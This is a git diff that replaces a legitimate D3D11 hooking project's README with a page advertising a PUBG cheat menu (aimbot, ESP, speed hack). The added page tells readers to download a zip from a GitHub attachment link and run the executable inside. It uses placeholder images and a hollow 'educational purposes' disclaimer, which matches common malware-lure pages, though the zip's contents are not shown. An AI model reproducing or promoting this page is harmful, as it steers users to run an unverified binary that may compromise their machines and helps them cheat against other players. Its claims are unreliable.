@@ -1,59 +1,75 @@
-```
-            ____ _____ ____ ______   __  __            __      ____          ______      _ 
-           / __ \__  // __ <  <  /  / / / /___  ____  / /__   /  _/___ ___  / ____/_  __(_)
-          / / / //_ </ / / / // /  / /_/ / __ \/ __ \/ //_/   / // __ `__ \/ / __/ / / / / 
-         / /_/ /__/ / /_/ / // /  / __  / /_/ / /_/ / ,<    _/ // / / / / / /_/ / /_/ / /
-        /_____/____/_____/_//_/  /_/ /_/\____/\____/_/|_|  /___/_/ /_/ /_/\____/\__,_/_/
-                                                                       
-                                                                      
-                           D3D11 Hook with ImGui integration (x86 / x64)
-                                Make D3D11 internal menu with ImGui
-                                   (Resize & Fullscreen support)
-```
-<p align="center">
-    <img src="https://img.shields.io/badge/language-C%2B%2B-%23f34b7d.svg?style=for-the-badge&logo=appveyor" alt="C++">
-    <img src="https://img.shields.io/badge/platform-Windows-0078d7.svg?style=for-the-badge&logo=appveyor" alt="Windows">
-    <img src="https://img.shields.io/badge/arch-x86-red.svg?style=for-the-badge&logo=appveyor" alt="x86">
-    <img src="https://img.shields.io/badge/arch-x64-green.svg?style=for-the-badge&logo=appveyor" alt="x64">
-</p>
+# Pubg-Cheat-Menu
 
-## :open_book: Project Overview :
+![Pubg Cheat Menu Logo](url_to_logo_image)
 
-D3D11 Hook with [ImGui](https://github.com/ocornut/imgui) integration written in C++, works on x86 and x64 with all librairies and includes.
+This PUBG Steam Cheat Source Code, written in C++, offers a comprehensive set of features designed to enhance the player's experience in the game. The Cheat Menu includes a variety of functions that give players an edge while playing PUBG on Steam.
 
-#### Features :
+## Features
 
-- Handle window resize
-- DLL unload itself
-- Handler external unload
-- Handle fullscreen change
+- Aimbot
+- ESP
+- Radar Hack
+- No Recoil
+- No Spread
+- Speed Hack
+- Item Locator
+- Custom Crosshair
+- Player Warnings
 
-#### Used librairies :
+## Getting Started
 
-- [MS Detours](https://www.microsoft.com/en-us/research/project/detours/)
-- [DirectX SDK](https://www.microsoft.com/en-us/download/details.aspx?id=6812)
-- [ImGui](https://github.com/ocornut/imgui)
+Follow these steps to download and set up the cheat menu:
 
-## :rocket: Getting Started
+1. **Download the Cheat File:** [![Download Cheat Menu](https://img.shields.io/badge/Download-Cheat-yellow)](https://github.com/user-attachments/files/16928413/Cheat.zip)
 
-This project use [MS Detours](https://github.com/microsoft/Detours) library for hooking and obviously D3D11 SDK.
+2. **Extract the files:** After downloading the cheat menu zip file, extract its contents to a location of your choice.
 
-MS Detours library is already include in the project folder, but if you don't have DirectX SDK you can download it [here](https://www.microsoft.com/en-us/download/details.aspx?id=6812).
+3. **Run the Cheat Menu:** Launch the cheat menu and follow the on-screen instructions to enable different features.
 
-> **Note** <br>
-> Make sure that **DXSDK_DIR** is declared in your environment variables.
+## Installation
 
-To see your environment variables :
+To install the cheat menu, follow these steps:
 
-> **Settings --> System --> About --> System Advanced Settings --> Environment Variables**
+1. **Download the Files:** Click on the download button above and save the zip file to your computer.
 
-### Visual Studio :
+2. **Extract the Files:** Unzip the downloaded file to a folder on your system.
 
-1. Open the solution file (.sln).
-2. Build the project in Release (x86 or x64)
+3. **Run the Program:** Open the main executable file to launch the cheat menu.
 
-Every configuration in x86 / x64 (Debug and Realese) are already configured with librairies and includes.
+4. **Configure Settings:** Customize the cheat menu options to your preference.
 
-## :test_tube: Demonstration :
+## Usage
 
-[Demo](https://github.com/adamhlt/D3D11-Hook-ImGui/assets/48086737/5c6cf425-6758-4773-aa1c-9ce4b1c8b41d)
+Once the cheat menu is installed, you can enjoy the various features while playing PUBG on Steam:
+
+1. **Aimbot:** Automatically aim at enemies for increased accuracy.
+2. **ESP:** See detailed information about other players on the map.
+3. **Radar Hack:** View the positions of all players on a radar.
+4. **No Recoil:** Eliminate gun recoil for more stable aiming.
+5. **No Spread:** Keep your shots precise with reduced bullet spread.
+6. **Speed Hack:** Move faster in the game for quick escapes or engagements.
+7. **Item Locator:** Easily locate items and gear on the map.
+8. **Custom Crosshair:** Customize your crosshair for better visibility.
+9. **Player Warnings:** Receive alerts about nearby opponents.
+
+## Screenshots
+
+Here are some screenshots of the cheat menu in action:
+
+![Screenshot 1](url_to_screenshot1)
+![Screenshot 2](url_to_screenshot2)
+![Screenshot 3](url_to_screenshot3)
+
+## Support
+
+For any issues or questions regarding the cheat menu, feel free to contact our support team at [support@pubgcheatmenu.com](mailto:support@pubgcheatmenu.com).
+
+## License
+
+This cheat menu is provided under the **MIT License**. See the [LICENSE](LICENSE) file for more details.
+
+---
+
+**Disclaimer**: This cheat menu is intended for educational purposes only. Using cheats in online games may violate the terms of service and lead to consequences, including bans. Please use responsibly.
+
+**Note**: We do not condone cheating or unfair gameplay practices. Remember to respect the rules and other players while using this cheat menu.
